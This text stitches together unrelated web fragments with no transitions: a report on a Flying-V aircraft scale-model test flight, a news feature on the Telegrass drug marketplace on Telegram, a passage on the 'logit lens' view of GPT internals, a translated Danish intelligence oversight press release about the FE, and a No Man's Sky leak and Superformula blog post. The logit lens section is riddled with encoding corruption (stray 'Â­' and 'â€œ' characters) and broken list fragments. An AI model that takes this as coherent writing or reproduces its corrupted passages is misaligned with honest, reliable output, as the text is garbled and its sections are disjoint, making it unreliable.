The plane’s thrust was good and flight speeds and angles were as predicted.</p><p>But testing new technology is never straightforward. The team had a challenging week in which they had to change the centre of gravity of the aircraft and fix the antenna to improve telemetry. The flight has now also confirmed that the current design still shows too much ‘Dutch roll’, causing a slightly rough landing. A next step for the team is to use the data collected during the flight for an aerodynamic (software) model of the aircraft. This will make it possible to programme it in a flight simulator to be used in future research , while further improving the flight characteristics. The team will also prepare the scale model for future flight tests.&nbsp;</p><div id="c651315">

</div><div id="c650988"><p>The Flying-V is a design for a highly energy-efficient long-distance aeroplane. The aircraft’s design integrates the passenger cabin, the cargo hold and the fuel tanks in the wings, creating a spectacular V-shape. Computer calculations have predicted that the aircraft’s improved aerodynamic shape and reduced weight will reduce fuel consumption by 20% compared to today’s most advanced aircraft. KLM has been a partner in the project since 2019. Also due to their support, the project team has been able to build this scale model. It was first presented at the 100th anniversary of KLM in October 2019. Various business partners are now involved in the project, including Airbus. Airbus is also an explicit supporter for the first flight. The partners are working together on a research plan to fine-tune the concept. Next step: providing the Flying-V with sustainable propulsion, taking into account that the design seems highly suitable to carry liquid hydrogen instead of kerosene. </p></div><div id="c650998"><p><em>Webcast</em>: On 1 September Dr. Roelof Vos and Prof. Henri Werij showed and explained what happened during the test week.

<p><span>I</span>n February 2019, Amos Dov Silver, a slight man in his mid-30s who often wears his shoulder-length hair in a bun, received a Telegram message inviting him to a wedding in Ukraine. The sender had worked with Silver for more than two years and wanted him to stand in for his father at the altar. “As you know, I don’t have a family,” he wrote. Silver agreed, and the following month, he flew from Arizona to Kyiv. Less than 48 hours later, he awoke to find five Israeli police officers standing in his hotel room.</p>



<p>Silver, an American-Israeli from a Hasidic background, started using his Facebook page as a marketplace to connect marijuana dealers with buyers in 2015, after years of loudly advocating for the drug’s legalization in Israel. This was four years after the emergence of <a href="https://www.vanityfair.com/news/2017/04/silk-road-ross-ulbricht-drugs-murder">Silk Road</a>, which quickly became the gold standard for decentralized, anonymous marketplaces operating on the darknet. Founded by the American Ross Ulbricht (whose online <em>nom de guerre </em>was<em> </em>“Dread Pirate Roberts”), Silk Road was estimated to be worth over $1 billion within two years of its founding, selling everything from pot to AK-47s. As the website grew in notoriety, Ulbricht became a model for a new generation of digital drug kingpins — and, with his arrest in 2013, a harbinger of what might await successors like Silver.&nbsp;</p>



<p>When Israel decriminalized recreational marijuana use in 2017, Silver and a team of coders and managers transferred their service to the Russian messaging platform Telegram. The app is popular with activists and journalists around the world because of its end-to-end encryption, which means that the cryptographic keys needed to decrypt a message are stored with only the sender and receiver. This makes it essentially impossible for anyone, even the app maker, to decode an intercepted message. Thanks to this built-in anonymity, buying drugs through Telegrass became as easy as ordering a pizza. Unlike traditional drug cartels, Telegrass leadership doesn’t profit from individual deals; instead, to advertise their wares, dealers pay 420 shekels ($122.25) for access to the platform. Unscrupulous sellers are kicked off and get their names posted on a “wall of shame.”</p>



<p>When Telegrass arrived in Ukraine in 2017, its operators found conditions perfectly suited to running a black-market business. A permissive legal landscape and weak rule of law — as well as the large number of visiting Israelis — made it a natural candidate for Telegrass’ expansion. Additionally, while most countries mandate some form of identity verification to purchase a SIM card and register a phone number, Ukraine — along with Israel and the United States — does not, making it impossible for law enforcement to trace Telegram accounts registered under a phone number.</p>



<p>Soon after Telegrass launched in Ukraine, thousands of competing channels emerged, with the most popular attracting tens of thousands of subscribers. The old style of drug dealing, based on face-to-face interactions between consumers and dealers, disappeared. Viacheslav Markov, dean of the Faculty of Cyber Police at the Kharkiv National University of Internal Affairs, has said that 90% of drug sales in Ukraine now occur via Telegram. Viacheslav Safonov, the deputy head of Ukraine’s Department for Combating Drug Crimes, concurs. In addition to being better for advertising, the new system is safer for dealers. When buyers knew who they had purchased drugs from, there was an inclination to “share” that information with law enforcement when pressed. Now, that’s no longer possible.</p>



<p>In prosecuting Silver, Israeli authorities claimed that “Telegrass changed the face of crime.” Less than two years after his arrest, it’s unclear whether Silver was personally responsible for transforming the drug market or if he was simply an early and influential adopter of technology that would become the status quo. Whichever is true, it’s clear that, in many parts of the world, the system that Telegrass perfected has become the dominant model for buying and selling illegal drugs.</p>

<p><strong>In Kyiv, graffiti</strong> advertising Telegram drug channels is visible on nearly every city block, with tags directing buyers to @go420, @Kushcrew, or @kyivweeds. David Plaster, who runs the Kyiv-based nonprofit Anomaly, said his organization painted over more than 15,000 tags over the last 18 months, half in the capital alone. But as soon as the graffiti is eliminated, more appears. And removing it has little impact on business. Marijuana, which is grown in outlying cities near Kyiv, accounts for an estimated 13 billion hryvnias ($500,000,000) in sales per month across Ukraine. The operations are decentralized, so employees often have no idea who they’re working with, or for. That means that even if low-level dealers get busted, suppliers and distributors remain hidden from law enforcement. “Even with a sting operation, faking a channel, you can only get the buyer; it doesn’t help with the supply chain,” Plaster explained. “You can’t crack that closed loop.”</p>

<p>Once a customer joins a drug channel on Telegram, a bot will typically respond with a menu of items available for purchase. On a typical day, offerings might include a popular strain called Gagarin, named for the Soviet cosmonaut, which is advertised as a hybrid with “aromas of mint and blueberry,” or a strain called White Russian, which is earthy and spicy with “cheese flavor.” When a customer makes a selection, an anonymous operator will send a link asking for payment via cryptocurrency or through an encrypted payment platform, which in Ukraine is usually EasyPay, a Belarusian e-payment platform that allows money transfers to be made via a phone number rather than a bank account. After the money is received, the seller will send an image that includes an address or GPS coordinates signaling where the drugs are hidden.</p>



<p>That day, March 12, law enforcement agents from Israel, the U.S., Ukraine, and Germany arrested 42 people in those countries in connection with Telegrass, the encrypted drug marketplace that Silver co-founded and ran. Directed by the Israel National Cyber Directorate, the bust marked the final stage of an international operation to take down the enterprise, which, by 2018, grossed an estimated $17 million a month in sales. Telegrass was one of the world’s biggest app-based drug markets, and, from Israel, it migrated to Germany, Ukraine, and other countries in Europe, spawning countless copycats.</p>



<p>The main downside of a fully anonymous marketplace is that it lends itself easily to fraud. Common scams include sellers accepting money before deleting a Telegram conversation or simply giving buyers phony drop-off locations. “[The channels are] often operated by men in prison who send these messages on their phones,” an anonymous buyer told <em>Rest of World</em>, adding that he would frequently have to try four or five different services before finding one that worked. Safonov, of the country’s anti-drug office, confirms that this kind of fraud makes up “one of the main types of ‘earnings’ for prisoners,” who will offer products at lower price points to target “novice consumers and those trying to save money.”</p>



<p>High levels of police mistrust have also contributed to theories that police are not only protecting the drug trade but actively participating in it. Telegram user @glodov, who advocates for marijuana legalization in Ukraine, claims that certain drug delivery channels are operated by police as avenues for extortion. He cited an instance in which a buyer went to pick up a package and encountered two officers waiting for him. “They tell you that you need to pay $100 or $200, and then they will leave you alone,” he says. “They want you to pay not to go to jail.”</p>



<p>(This kind of institutionalized corruption hearkens back to an earlier era: In the post-Soviet 1990s, the country saw a boom in criminal gangs, with police often functioning as their enforcers. While Ukrainian officials initiated a massive police overhaul in 2015 to address structural problems in the force, only 7.7% of officers lost their jobs. Most appealed their dismissals and <a href="https://www.opendemocracy.net/en/odr/where-is-ukraines-new-police-force/">were eventually reinstated</a>.</p>



<p>Safonov also acknowledges that there has been illegal collaboration between authorities and dealers, even recently. In one <a href="https://hromadske.ua/posts/kolishni-policejski-organizuvali-narkolaboratoriyu-na-kiyivshini">notable instance earlier this year</a>, former police officers were found operating a methadone and amphetamine lab in an industrial building on the outskirts of Kyiv. But, he insists, this was an exception for an otherwise by-the-book force: “Bad grass grows in every garden.”</p>

<p><strong>Regardless of who</strong> is selling, Telegram is, by design, extremely difficult to police. “With an end-to-end encrypted app, users can reasonably expect that investigators won’t be able to access their chats,” said Riana Pfefferkorn, Associate Director of Surveillance and Cybersecurity at the Stanford Center for Internet and Society. While not all Telegram data is end-to-end encrypted, the company stores data in multiple centers controlled by different jurisdictions, to ensure that no government can access its systems. According to Pfefferkorn, “Companies such as Telegram and Signal intentionally minimize the amount of user metadata they store, precisely so that there is less that can be handed over to law enforcement if investigators come knocking.” (According to Telegram, while it will not interfere with private chats, it will block public channels it deems illegal, such as those belonging to terrorists and narcotraffickers.)</p>

If one apÂ­plies the same funcÂ­tion to the acÂ­tiÂ­vaÂ­tions of <em>inÂ­terÂ­meÂ­diÂ­ate </em>GPT layÂ­ers, the reÂ­sultÂ­ing disÂ­triÂ­buÂ­tions make inÂ­tuÂ­itive sense.</p><ul><li><p>This â€œlogit lensâ€� proÂ­vides a simÂ­ple (if parÂ­tial) inÂ­terÂ­pretabilÂ­ity lens for GPTâ€™s inÂ­terÂ­nals.</p></li><li><p>Other work on inÂ­terÂ­pretÂ­ing transÂ­former inÂ­terÂ­nals has foÂ­cused mostly on what the atÂ­tenÂ­tion is lookÂ­ing at. The logit lens foÂ­cuses on <em>what</em> GPT â€œbeÂ­lievesâ€� afÂ­ter each step of proÂ­cessÂ­ing, rather than <em>how</em> it upÂ­dates that beÂ­lief inÂ­side the step.</p></li></ul></li><li><p>ThÂ­ese disÂ­triÂ­buÂ­tions gradÂ­uÂ­ally conÂ­verge to the fiÂ­nal disÂ­triÂ­buÂ­tion over the layÂ­ers of the netÂ­work, ofÂ­ten getÂ­ting close to that disÂ­triÂ­buÂ­tion long beÂ­fore the end.</p><ul><li><p>At some point in the midÂ­dle, GPT will have formed a â€œpretty good guessâ€� as to the next toÂ­ken, and the later layÂ­ers seem to be reÂ­finÂ­ing these guesses in light of one anÂ­other.</p></li><li><p>The genÂ­eral trend, as one moves from earÂ­lier to later layÂ­ers, is </p><ul><li><p>â€œnonÂ­sense /â€‹ not inÂ­terÂ­pretableâ€� (someÂ­times, in very early layÂ­ers) --&gt; </p></li><li><p>â€œshalÂ­low guesses (words that are the right part of speech /â€‹ regÂ­ister /â€‹ etc)â€� --&gt;</p></li><li><p>â€œbetÂ­ter guessesâ€�</p></li></ul></li><li><p>...though some of those phases are someÂ­times abÂ­sent.</p></li></ul></li><li><p>On the other hand, o<em>nly </em>the inÂ­puts look like the inÂ­put toÂ­kens.</p><ul><li><p>In the logit lens, the early layÂ­ers someÂ­times look like nonÂ­sense, and someÂ­times look like very simÂ­ple guesses about the outÂ­put. They alÂ­most never look like the inÂ­put.</p></li><li><p>ApÂ­parÂ­ently, the model does not â€œkeep the inÂ­puts aroundâ€� for a while and gradÂ­uÂ­ally proÂ­cess them into some inÂ­terÂ­meÂ­diÂ­ate repÂ­reÂ­senÂ­taÂ­tion, then into a preÂ­dicÂ­tion.</p></li><li><p>InÂ­stead, the inÂ­puts are <em>imÂ­meÂ­diÂ­ately </em>conÂ­verted to a very differÂ­ent repÂ­reÂ­senÂ­taÂ­tion, which is smoothly reÂ­fined into the fiÂ­nal preÂ­dicÂ­tion.</p></li></ul></li><li><p>This is remÂ­iÂ­nisÂ­cent of the perÂ­specÂ­tive in <a href="https://arxiv.org/abs/1807.03819">UniverÂ­sal TransÂ­formÂ­ers</a> which sees transÂ­formÂ­ers as iterÂ­aÂ­tively reÂ­finÂ­ing a guess.</p><ul><li><p>HowÂ­ever, UniverÂ­sal TransÂ­formÂ­ers have both an enÂ­coder and deÂ­coder, while GPT is only a deÂ­coder. This means GPT faces a tradeÂ­off beÂ­tween keepÂ­ing around the inÂ­put toÂ­kens, and proÂ­ducÂ­ing the next toÂ­kens.</p></li><li><p><em>EvenÂ­tuÂ­ally</em> it has to spit out the next toÂ­ken, so the longer it spends (in depth terms) proÂ­cessÂ­ing someÂ­thing that looks like toÂ­ken <em>i, </em>the less time it has to conÂ­vert it into toÂ­ken <em>i+1</em>. GPT has a deadÂ­line, and the clock is tickÂ­ing.</p></li></ul></li><li><p>More specÂ­uÂ­laÂ­tively, this sugÂ­gests that GPT mostly â€œthinks in preÂ­dicÂ­tive space,â€� imÂ­meÂ­diÂ­ately conÂ­vertÂ­ing inÂ­puts to preÂ­dicted outÂ­puts, then reÂ­finÂ­ing guesses in light of other guesses that are themÂ­selves beÂ­ing reÂ­fined.</p><ul><li><p>I think this might sugÂ­gest there is some funÂ­daÂ­menÂ­tally betÂ­ter way to do samÂ­pling from GPT modÂ­els?

I imagÂ­ine there is other inÂ­forÂ­maÂ­tion preÂ­sent in the acÂ­tiÂ­vaÂ­tions that canÂ­not be unÂ­derÂ­stood by lookÂ­ing at logÂ­its over toÂ­kens.

Each toÂ­ken is a sinÂ­gle item from a voÂ­cabÂ­uÂ­lary of <em>N_v</em>=50257 byte pairs (mostly English words).</p></li><li><p>As <em>outÂ­put,</em> GPT reÂ­turns a probÂ­aÂ­bilÂ­ity disÂ­triÂ­buÂ­tion over the voÂ­cabÂ­uÂ­lary. It is trained so this disÂ­triÂ­buÂ­tion preÂ­dicts the next toÂ­ken.</p></li><li><p>That is, the modelâ€™s outÂ­puts are shifted forÂ­ward by one poÂ­siÂ­tion relÂ­aÂ­tive to the inÂ­puts. The toÂ­ken at poÂ­siÂ­tion <em>i</em> should, afÂ­ter flowÂ­ing through the layÂ­ers of the model, turn into the toÂ­ken at poÂ­siÂ­tion <em>i+1</em>. (More acÂ­cuÂ­rately, a disÂ­triÂ­buÂ­tion over the toÂ­ken at poÂ­siÂ­tion <em>i+1.</em>)</p></li></ul></li><li><p> VoÂ­cab and emÂ­bedÂ­ding spaces</p><ul><li><p>The voÂ­cab has size <em>N_v</em>=50257, but GPT works inÂ­terÂ­nally in a smaller â€œemÂ­bedÂ­dingâ€� vecÂ­tor space, of diÂ­menÂ­sion <em>N_e</em>. </p><ul><li><p>For exÂ­amÂ­ple, in the GPT-2 1558M model size, <em>N_e</em>=1600.  (Below, Iâ€™ll ofÂ­ten asÂ­sume weâ€™re talkÂ­ing about GPT-2 1558M for conÂ­creteÂ­ness.)</p></li></ul></li><li><p>There is an <em>N_v</em>-by-<em>N_e</em> emÂ­bedÂ­ding maÂ­trix <em>W</em> which is used to proÂ­ject the voÂ­cab space into the emÂ­bedÂ­ding space and vice versa.</p></li></ul></li><li><p> In, blocks, out</p><ul><li><p>The first thing that hapÂ­pens to the inÂ­puts is a mulÂ­tiÂ­pliÂ­caÂ­tion by <em>W</em>, which proÂ­jects them into the emÂ­bedÂ­ding space. <a href="http://about:blank#fn-AtHPnbaLw7d3539eA-1">[1]</a></p></li><li><p>The reÂ­sultÂ­ing 1600-diÂ­menÂ­sional vecÂ­tor then passes through many neuÂ­ral netÂ­work blocks, each of which reÂ­turns anÂ­other 1600-diÂ­menÂ­sional vecÂ­tor.</p></li><li><p>At the end, the fiÂ­nal 1600-diÂ­menÂ­sional vecÂ­tor is mulÂ­tiÂ­plied by <em>Wâ€™s</em> transÂ­pose to proÂ­ject back into voÂ­cab space.</p></li><li><p>The reÂ­sultÂ­ing 50257-dim vecÂ­tors are treated as logÂ­its.

The Danish military intelligence service (<a href="https://en.wikipedia.org/wiki/Danish_Defence_Intelligence_Service" target="_blank"><i>Forsvarets Efterretningstjeneste</i></a> or FE), which is also responsible for signals intelligence, has been accused of unlawful activities and deliberately misleading the intelligence oversight board. </p><p>

After the oversight board (<a href="https://www.tet.dk/om-tilsynet/?lang=en" target="_blank"><i>Tilsynet med Efterretningstjenesterne</i></a> or TET) received information from a whistleblower, the head of the FE, Lars Findsen, and three other senior officials of the intelligence service were suspended.</p><p>

Here, I will provide a translation of the <a href="#press"><b>press release</b></a> of the oversight board, as well as details from its <a href="#reports"><b>earlier reports</b></a>, showing that there were problems at the FE for years. An overview of the <a href="#cooperation"><b>international cooperation</b></a> between the FE and foreign partner agencies provides a context for what likely went wrong at the Danish service.</p><p><a href="https://2.bp.blogspot.com/-MT_suhuKqVM/X0oAXcD0CnI/AAAAAAAAEuM/8_Rz2rYn7xMZZVLrSsktEVmwcYXpNVi1QCLcBGAsYHQ/s1600/fe-header.jpg" imageanchor="1" target="_blank"><img src="https://2.bp.blogspot.com/-MT_suhuKqVM/X0oAXcD0CnI/AAAAAAAAEuM/8_Rz2rYn7xMZZVLrSsktEVmwcYXpNVi1QCLcBGAsYHQ/s1600/fe-header.jpg" width="550"></a><br>

The affair came to light when on August 24, the Danish Ministry of Defense issued a short <a href="https://fmn.dk/nyheder/Pages/Ledende-medarbejdere-i-Forsvarets-Efterretningstjeneste-fritaget-fra-tjeneste-indtil-videre.aspx" target="_blank">statement</a> saying that the head of the FE and two other officials were suspended  from duty until further notice. Svend Larsen, the chief of Central and West Zealand Police, was appointed as acting chief of the FE. Later, a third official was also suspended.</p><p>

The same day, the Danish Intelligence Oversight Board published a <a href="https://www.tet.dk/wp-content/uploads/2020/08/PRESSEMEDDELELSE.pdf" target="_blank">press release</a> with the unclassified results of its investigation into the issues that led to Findsen's suspension.

PRESS RELEASE<p>

<b>The Intelligence Oversight Board completed a special investigation into the
Defense Intelligence Service (FE) on the basis of material submitted by
one or more whistleblowers.</b></p><p>

<i>In November 2019, one or more whistleblowers provided the Intelligence Oversight Board with a significant amount of material relating to the FE,
which the Board has not hitherto been aware of or able to acquire.
The material is of such a nature that the Board decided to focus its oversight
of the FE in order to carry out an in-depth investigation of the
present situation. With this announcement, the Board publishes the
unclassified results of the investigation.</i></p><p>


On the basis of the Board's investigation of the submitted material, the Board sent
an analysis in four volumes to the Minister of Defense containing
the Board's conclusions and recommendations on 21 August 2020.</p><p>

Throughout the process of the special investigation of the FE, the Board has held the
Minister of Defense informed. The Minister of Defense has regularly expressed support for
the Board's in-depth examination of the material.</p><p>

The Board's assessments and recommendations deal with matters that are fully or partially within its legal supervision authority according to  the FE Act and the rules and conditions based on it, which the Minister, in the opinion of the Board, should have
knowledge of, cf. § 16, stk. 2. of the FE Act.</p><p>

Based on a source-critical examination of the submitted material, the Board assesses, among other things, the following:</p><blockquote>
- That since the establishment of the Board in 2014 and until the summer of 2020, the FE has, among other things, on several occasions during the Board's inspections and meetings with the head of the FE, withheld key and crucial information and provided the Board with incorrect information regarding the service's collection and disclosure of information.<p>

The Board is of the opinion that the statutory duty to provide information is absolutely necessary for functional oversight and that it is based on trust by the legislator that the FE complies with this obligation in all respects. The result of these repeated breaches of the statutory duty to provide information is that the legality check that the Board is required to carry out under the FE Act, and which contributes to the legitimacy of the FE's work, does not work out as intended.</p><p>

- That at central parts of the FE's collection capabilities there are risks that can lead to unlawful collection against Danish citizens.</p><p>

- That the submitted material indicates that the FE's management has failed to follow up on, or further investigate indications of espionage within the Ministry of Defense.</p><p>

- That there is a culture of insufficient legal awareness within the FE's management and parts of the service, which results in unlawful activities or inappropriate situations within the service to be shelved, including not informing the Oversight Board about matters relevant to its supervision.</p><p>

- That the submitted material indicates that the FE, prior to the establishment of the Board in 2014, initiated operational activities in violation of the Danish law, including obtaining and passing on a significant amount of information about Danish citizens.</p><p>

- That the FE has unlawfully processed information about an employee of the Oversight Board.</p></blockquote>
<br>
Against this background, the Board recommends that a political position be taken on the following:<br>
<blockquote>
- Whether there should be an investigation into whether the FE has carried out and is carrying out its task as a national security authority within ​​the Ministry of Defense in accordance with § 1, stk. 2 of the FE Act.<p>

- The need to uncover whether the FE has adequately informed policy makers about all relevant issues concerning key parts of the service's collection capabilities.</p></blockquote>
<br>
Given the options of the FE Control Act, the Board does not have the possibilities to further uncover specific matters that emerge from the submitted material. Therefore, the Board generally recommends the following:<br>
<blockquote>
- That an early evaluation of the FE Act will be carried out to determine whether the Board has the necessary legal authorities and resources to carry out an effective legal oversight of the FE, including whether the Board must have the authority to conduct interrogations of the FE's employees as witnesses.<p>

- That, based on of the circumstances of the Board's receipt of the submitted material, an external whistleblower scheme for the FE is established, which can best be placed under the auspices of the Board.</p><p>

Such a scheme should improve the ability of current and former FE employees to comment on controversial issues without fear of retaliation, including employment or criminal consequences. Furthermore, such a scheme would allow classified information to be passed on in a secure environment. The scheme must also ensure that an external whistleblower body has the necessary resources and instruments to protect the persons who submit information according to this scheme.</p></blockquote>
<br>
The Board had thorough considerations regarding the publication of the conclusions and recommendations of the investigation. It is crucial for the oversight that the public has as much insight as possible. However, in the view of the extremely sensitive circumstances surrounding the submission of the material to the Board and its classified content, the Board may not provide further information to the public.<p>

<i><b>Facts about the Intelligence Oversight Board</b></i></p><p>

The Intelligence Oversight Board is a special independent monitoring body that supervises that the PET processes information about natural and legal persons in accordance with the law, and that the FE processes information about natural and legal persons domiciled in Denmark in accordance with the law. The Board was established by the Act on the Police Intelligence Service (PET), which, like the Act on the Defense Intelligence Service (FE), entered into force on 1 January 2014.</p><p>

Following the entry into force on 1 July 2014 of the Center for Cyber ​​Security (CFCS) Act, the Board has also monitored that CFCS processes information about natural persons in accordance with the legislation.</p><p>

The Board consists of five members appointed by the Minister of Justice after consultation with the Minister of Defense. The chairman, who has to be a High Court judge, is appointed on the recommendation of the Presidents of the Danish Eastern and Western High Courts, while the other members are appointed after consultation with the Parliamentary Committee for the Intelligence Services.</p><p>

The members are:</p><p>

- Michael Kistrup, High Court Judge, High Court of Eastern Denmark (Chairman)<br>
- Erik Jacobsen, Chairman of the Board of Directors, Roskilde University<br>
- Pernille Christensen, Legal Chief, National Association of Local Authorities<br>
- Professor Henrik Udsen, University of Copenhagen<br>
- Professor Rebecca Adler-Nissen, University of Copenhagen</p><p>

<p><span size="+2">Problems in earlier reports</span></p><p>

The FE's unauthorized and illegal activities described in the press release of the Oversight Board may actually not have come as a complete surprise.</p><p>

 Already in several earlier reports, the Oversight Board noticed that the FE conducted quite a large number of unlawful "raw data searches", which is the term used for untargeted interception. This method enables the FE to "obtain very large amounts of information (several hundred million communications per year)" - according the <a href="https://www.tet.dk/wp-content/uploads/2019/09/FE_UK_19.pdf" target="_blank">Annual Report 2018</a>.</p><p>

In the English version of its <a href="https://www.tet.dk/wp-content/uploads/2019/02/FE2018_uk_180219.pdf" target="_blank">Annual Report 2017</a>, in which the FE is mentioned as the Danish Defense Intelligence Service or DDIS, the oversight board says:</p><blockquote>
"the checks showed that in four instances DDIS engaged in unlawful targeted procurement
of information about persons resident in Denmark for a total of 20 days in 2014, eight months
in 2014-2015, four days in 2016 and 17 months in 2016-2017. The checks further showed that in
20 percent of the samples drawn DDIS made unlawful searches in raw data.<br>
 In the Oversight
Board’s opinion, the unlawful instances of procurement, including searches in raw data, were
in the nature of negligent actions in all cases. Similarly, the Oversight Board …</blockquote></div></div>

<p><em>[ NOTE: This post contains references to allegedly leaked information about upcoming versions of the game and, as such, should be viewed as a <strong>spoiler</strong> post. Be warned. ]</em></p>



<p>On June 5th, Hello Games updated the Steam (PC) Experimental Branch of <em>No Man’s Sky</em> with an update several gigabytes in size. (The Experimental Branch is a beta version of the game that Steam players can opt into in order to see the latest features and help Hello Games work out the kinks by providing feedback and bug reports.) The <a href="https://steamcommunity.com/app/275850/discussions/0/2299597907723043384/">patch notes</a> for this release say only:</p>



<ul><li>Replaced networking back end.</li><li>Upgraded to OpenVR 1.10.30.</li></ul>



<div><figure><img src="https://nmsspot.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-08-at-5.43.13-PM.png" alt="" width="411" height="94" srcset="https://nmsspot.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-08-at-5.43.13-PM.png 1756w, https://nmsspot.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-08-at-5.43.13-PM-300x70.png 300w, https://nmsspot.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-08-at-5.43.13-PM-768x178.png 768w, https://nmsspot.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-08-at-5.43.13-PM-604x140.png 604w" sizes="(max-width: 411px) 100vw, 411px"></figure></div>



<p>Upon receiving this update, Experimental Branch players began seeing  little platform icons attached to players wandering around in the Anomaly (a networked area of the game). Hello Games also released this beta version of the game (or a similar version) for the Xbox One via the Xbox Insider Hub, a Microsoft service that allows users to opt into betas, akin to Steam’s beta option. Players on both platforms running these betas are seeing each other, with appropriate platform icon, in the Anomaly at the same time. This, along with a host of platform icons discovered in the beta release by data miners, clearly speaks to some level of cross-platform gameplay on the way. </p>



<p>Now, since May 19th we’ve known that new content of some sort was on the way, <a href="https://twitter.com/gregbuchanan/status/1262736368616108035">thanks to a tweet</a> from author / scriptwriter Greg Buchanan who was behind the (great) Artemis storyline from 2017’s <em>Atlas Rises</em> update to <em>No Man’s Sky</em>. On May 29th, Hello Games posted the <a href="https://www.nomanssky.com/2020/05/beyond-development-update-11/"><em>Beyond</em> Development Update 11 page</a> on their website, detailing a number of new things going on in the game, including mention of a content-related hiatus to the weekend missions. </p>



<blockquote><p>Beginning this weekend, there will be a short pause between seasons of weekend missions. These will be returning very soon, featuring new story content we’re really enjoying from one of the writers on Atlas Rises.</p></blockquote>



<p>(There actually <em>was</em><a href="https://nmsspot.com/2020/06/11/community-event-31-the-event-that-wasnt-sort-of-it-was-pretty-though/"> a mission this past weekend</a>, but it appears that it may have been a test of the new networking back end / cross-play and only visible to those running beta versions on Steam and Xbox One.)</p>



<p>The following day, <a href="https://nmsspot.com/wp-content/uploads/2020/06/Yl78hxy.png">an anonymous post appeared</a> on 4chan (let me pass the salt) entitled “No Man’s Sky summer update leaked details.” Within, the poster claims that according to his/her source, a content update is imminent and that it will tease out details of what is to come in a larger summer update. I am not going to print all of the details that were mentioned, here, but will say that what caught my <em>particular</em> interest is the suggestion that this coming update is “heavily focused on pro[c]gen” (<a href="https://en.wikipedia.org/wiki/Procedural_generation">procedural generation</a>), with the indication,</p>



<blockquote><p>…my source has told me that hello games have been working on ambitious things with their procgen and will improve terrain diversity and formations. new biomes will be introduced &amp; more “alien” planets.</p></blockquote>



<p>Additionally, data mining efforts of <a href="https://twitter.com/ProceduralTRV">Procedural Traveller</a> on the June 5th PC Experimental release <a href="https://www.youtube.com/watch?v=8890itJ2-io">reveal several findings</a> that seem to backup the notion of new biomes on the way. (It is worth bearing in mind, however, that there are some items found in the data from even years past that have not come to fruition in the game.) Also, a number of mild visual / rendering changes have already been <a href="https://steamcommunity.com/app/275850/discussions/0/2299597907723043384/">observed by myself</a> and others in the PC Experimental version. </p>



<p>The reason that this struck a chord with me is the fact that just last month, the patent for the “<a href="https://www.nature.com/articles/news030331-3">Superformula</a>,” created by Belgian biologist Johan Gielis, expired. </p>



<div><figure><img src="https://nmsspot.com/wp-content/uploads/2020/06/https-blogs-images.forbes.com-jvchamary-files-2016-07-superformula-1200x256-1.jpg" alt="" width="375" height="80" srcset="https://nmsspot.com/wp-content/uploads/2020/06/https-blogs-images.forbes.com-jvchamary-files-2016-07-superformula-1200x256-1.jpg 960w, https://nmsspot.com/wp-content/uploads/2020/06/https-blogs-images.forbes.com-jvchamary-files-2016-07-superformula-1200x256-1-300x64.jpg 300w, https://nmsspot.com/wp-content/uploads/2020/06/https-blogs-images.forbes.com-jvchamary-files-2016-07-superformula-1200x256-1-768x164.jpg 768w, https://nmsspot.com/wp-content/uploads/2020/06/https-blogs-images.forbes.com-jvchamary-files-2016-07-superformula-1200x256-1-604x129.jpg 604w" sizes="(max-width: 375px) 100vw, 375px"><figcaption>The Superformula (image: Johan Gielis / Botanical Society of America)</figcaption></figure></div>



<p>The Superformula is, as Gielis describes it, “A generic geometric transformation that unifies a wide range of natural and abstract shapes.” It is basically a modified take on an equation that describes a unit circle. The equation contains a number of variables and the geometric shape that it generates depends on the particular combination of values plugged into it. </p>



<p>Gielis was granted <a href="https://patents.google.com/patent/EP1177529B1">European</a> (in 2005) and<a href="https://patents.google.com/patent/US7620527"> U.S.</a> (in 2009) patents on the Superformula, restricting its potential uses. Those that followed the development progress of <em>No Man’s Sky</em> leading up to its release may recall  Genicap, a Dutch company developing products and tech based on the Superformula, claiming that Hello Games was in violation of the patent with its procedural space exploration game. Forbes’ article, “<a href="https://www.forbes.com/sites/jvchamary/2016/07/27/no-mans-sky-superformula/#78844e122474">Did ‘No Man’s Sky’ Steal A Scientist’s Superformula?</a>,” dated July 27, 2016, details the claim and goes a long way towards explaining what the Superformula is. </p>

<p>The New Yorker article “<a href="https://www.newyorker.com/magazine/2015/05/18/world-without-end-raffi-khatchadourian">World Without End</a>” (May 11, 2015), takes an extraordinarily deep look at the genesis story and early development of <em>No Man’s Sky</em>. One of the many anecdotes within the piece describes Hello Games lead Sean Murray, early on, using the Superformula to experiment with the creation of infinite organic shapes floating over a desert. That Murray, at some point, played with the formula seems to be the “proof” Genicap held on to in order to make their patent violation claim. Murray consistently denied that the Superformula was used in the development of <em>No Man’s Sky</em>, and <strong>it seems the logical conclusion that Hello Games created their own procedural generation algorithms, perhaps <em>inspired</em> by Gielis’ formula, that were used in the game. </strong>(The Superformula, itself, being a modification of another existing formula.)</p>



<p>And the patents have just expired. </p>



<figure><a href="https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms.jpg"><img src="https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms_1424.jpg" alt="" srcset="https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms_1424.jpg 1424w, https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms_1424-300x169.jpg 300w, https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms_1424-1024x576.jpg 1024w, https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms_1424-768x432.jpg 768w, https://nmsspot.com/wp-content/uploads/2020/06/red_wave_nms_1424-480x270.jpg 480w" sizes="(max-width: 1424px) 100vw, 1424px"></a></figure>



<p>If the anonymous poster is correct and Hello Games is presently doing “ambitious things” with the game’s procedural generation (and “ambitious” is the only way you could describe the <em>current</em> game’s proc gen, so in context, that’s quite a statement), could they now be using the Superformula in conjunction with their own routines, or to extend their routines in certain ways? It’s hard to say. Perhaps HG’s routines are well beyond the Superformula, and it would be of little use to them at this point. That seems quite likely, in fact. But, one can only speculate. </p>



